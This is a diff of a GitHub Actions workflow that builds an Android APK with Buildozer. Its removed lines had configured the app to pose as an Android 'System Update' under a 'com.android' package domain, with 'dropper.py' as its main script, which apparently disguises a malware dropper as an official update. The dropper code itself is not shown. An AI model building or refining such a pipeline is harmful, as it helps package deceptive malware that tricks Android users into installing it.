@@ -16,30 +16,28 @@ jobs:
         with:
           python-version: '3.10'
 
+      - name: Cache Buildozer global directory
+        uses: actions/cache@v4
+        with:
+          path: ~/.buildozer
+          key: buildozer-global-${{ hashFiles('buildozer.spec') }}
+
+      - name: Cache Buildozer project directory
+        uses: actions/cache@v4
+        with:
+          path: .buildozer
+          key: buildozer-project-${{ hashFiles('buildozer.spec') }}
+
       - name: Install system dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y \
-            git openjdk-17-jdk zlib1g-dev libffi-dev libssl-dev \
-            python3-pip build-essential libtool m4 autoconf automake
+          sudo apt-get install -y git openjdk-17-jdk zlib1g-dev libffi-dev libssl-dev python3-pip build-essential libtool m4 autoconf automake
 
-      - name: Install buildozer
+      - name: Install Buildozer
         run: pip install buildozer cython
 
-      - name: Initialize buildozer
-        run: buildozer init
-
-      - name: Configure buildozer.spec
-        run: |
-          sed -i 's/requirements = python3,kivy/requirements = python3,requests,urllib3/g' buildozer.spec
-          sed -i 's/title = My Application/title = System Update/g' buildozer.spec
-          sed -i 's/package.name = myapp/package.name = systemupdate/g' buildozer.spec
-          sed -i 's/package.domain = org.test/package.domain = com.android/g' buildozer.spec
-          sed -i 's/#source.main = main.py/source.main = dropper.py/g' buildozer.spec
-          echo 'android.accept_sdk_license = True' >> buildozer.spec
-
       - name: Build APK
-        run: yes | buildozer android debug deploy run --verbose
+        run: yes | buildozer android debug deploy run
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
